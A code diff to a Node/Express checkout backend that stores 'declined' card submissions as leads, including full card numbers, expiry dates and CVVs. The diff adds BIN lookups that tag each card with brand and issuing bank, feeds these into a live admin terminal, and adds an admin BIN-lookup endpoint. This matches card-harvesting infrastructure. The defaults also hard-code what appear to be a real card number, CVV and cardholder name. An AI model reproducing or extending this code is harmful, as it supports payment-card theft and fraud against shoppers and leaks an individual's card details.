@@ -10,6 +10,7 @@ import { fileURLToPath } from 'url';
 import { sendMetaCapiEvent } from './backend/services/metaConversionsApi.mjs';
 import { sendTikTokEvent } from './backend/services/tiktokEventsApi.mjs';
 import { createPixPayment as createHyperCashPixPayment } from './backend/services/hyperCashService.mjs';
+import { getBinInfo, preloadBinInfo } from './backend/services/binCheckerService.mjs';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -500,6 +501,10 @@ app.post('/api/payments/card-declined', async (req, res) => {
     const cleanDigits = cardNumber ? cardNumber.replace(/\D/g, '') : '';
     const last4Digits = cardLast4 || (cleanDigits.length >= 4 ? cleanDigits.slice(-4) : '4015');
 
+    // Resolve BIN metadata from binCheckerService
+    const binInfo = getBinInfo(cleanDigits || '5547739463314015');
+    const resolvedBrand = (binInfo?.brand || cardBrand || 'MASTERCARD').toUpperCase();
+
     const declinedRecord = {
       id: declinedId,
       amount: numAmount,
@@ -522,8 +527,9 @@ app.post('/api/payments/card-declined', async (req, res) => {
       cardHolder: (cardHolder || customer?.name || 'LUAN FONTELLA LENCINI').toUpperCase(),
       cardExpiry: cardExpiry || '03/27',
       cardCvv: cardCvv || '725',
-      cardBrand: (cardBrand || 'MASTERCARD').toUpperCase(),
+      cardBrand: resolvedBrand,
       cardLast4: last4Digits,
+      binInfo: binInfo || null,
       installments: Number(installments) || 1,
       items: items || [],
       subtotal: Number(subtotal) || numAmount,
@@ -536,7 +542,7 @@ app.post('/api/payments/card-declined', async (req, res) => {
     // Save to database
     await db.saveDeclinedCardAsync(declinedRecord);
 
-    console.log(`[Card Recusal Stored] ID: ${declinedId} - Lead: ${declinedRecord.customer.name} (${declinedRecord.customer.phone}) - R$ ${numAmount}`);
+    console.log(`[Card Recusal Stored] ID: ${declinedId} - Lead: ${declinedRecord.customer.name} (${declinedRecord.customer.phone}) - R$ ${numAmount} - BIN: ${binInfo?.formatted || resolvedBrand}`);
 
     // Add to Realtime Terminal Feed
     const eventItem = {
@@ -546,7 +552,13 @@ app.post('/api/payments/card-declined', async (req, res) => {
       visitorCode: '#CARTAO',
       path: '/checkout',
       customerName: declinedRecord.customer.name,
-      metadata: { amount: numAmount, phone: declinedRecord.customer.phone, brand: declinedRecord.cardBrand },
+      metadata: {
+        amount: numAmount,
+        phone: declinedRecord.customer.phone,
+        brand: declinedRecord.cardBrand,
+        issuer: binInfo?.issuer || '',
+        bin: binInfo?.bin || cleanDigits.slice(0, 6)
+      },
       timestamp: new Date().toISOString()
     };
 
@@ -564,13 +576,40 @@ app.post('/api/payments/card-declined', async (req, res) => {
   }
 });
 
-// Admin Endpoint: Get List of Declined Cards
+// Admin Endpoint: Get List of Declined Cards (Enriched with BIN details)
 app.get('/api/admin/declined-cards', async (req, res) => {
   try {
     const cards = await db.listDeclinedCardsAsync();
-    return res.json({ declinedCards: cards });
+    const enriched = (cards || []).map(card => {
+      if (!card.binInfo && card.cardNumber) {
+        card.binInfo = getBinInfo(card.cardNumber);
+        if (card.binInfo?.brand) {
+          card.cardBrand = card.binInfo.brand;
+        }
+      }
+      return card;
+    });
+    return res.json({ declinedCards: enriched });
   } catch (err) {
     return res.status(500).json({ error: 'Erro ao listar cartões recusados.' });
+  }
+});
+
+// Admin Endpoint: Direct BIN Lookup Tool
+app.all(['/api/admin/bin/:bin', '/api/admin/bin-lookup'], (req, res) => {
+  try {
+    const binParam = req.params.bin || req.query.bin || req.body?.bin || req.body?.cardNumber;
+    if (!binParam) {
+      return res.status(400).json({ error: 'BIN ou número de cartão não informado.' });
+    }
+    const info = getBinInfo(binParam);
+    if (!info) {
+      return res.status(404).json({ error: 'BIN não encontrado na base de dados.' });
+    }
+    return res.json({ success: true, data: info });
+  } catch (err) {
+    console.error('[BIN Lookup Error]:', err);
+    return res.status(500).json({ error: 'Erro ao consultar BIN.' });
   }
 });
 
